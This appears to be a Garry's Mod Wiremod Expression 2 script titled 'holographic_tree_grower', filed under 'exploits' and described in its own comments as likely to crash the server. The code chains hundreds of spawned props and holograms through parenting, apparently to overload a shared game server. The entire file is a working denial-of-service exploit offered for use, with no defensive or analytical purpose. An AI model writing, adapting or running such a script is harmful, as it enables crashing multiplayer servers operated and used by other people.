@name exploits/holographic_tree_grower
@inputs 
@outputs 
@persist N MAX
@trigger

# by Fasteroid
# inspired by the original (patched) "tree grower" exploit
# server crashing is extremely likely

if( first() ){
    MAX = 512
    holoCreate(N)
    holoParent(N,entity())
}

event tick(){
    if(N < MAX & propCanCreate() & holoCanCreate()){
        
        local Pos = entity():toWorld(vec(sin(N*4)*20,cos(N*4)*20,N*5) * 2)
        
        P = propSpawn("models/props_junk/PopCan01a.mdl",Pos,1)
        if(!P:isValid()){exit()}
        
        holoCreate(N+1, Pos)
        P:parentTo(holoEntity(N+1))
        
        holoColor(N+1,vec(255,0,0),100)
        holoParent(N+1,N)
        N++
    }
}
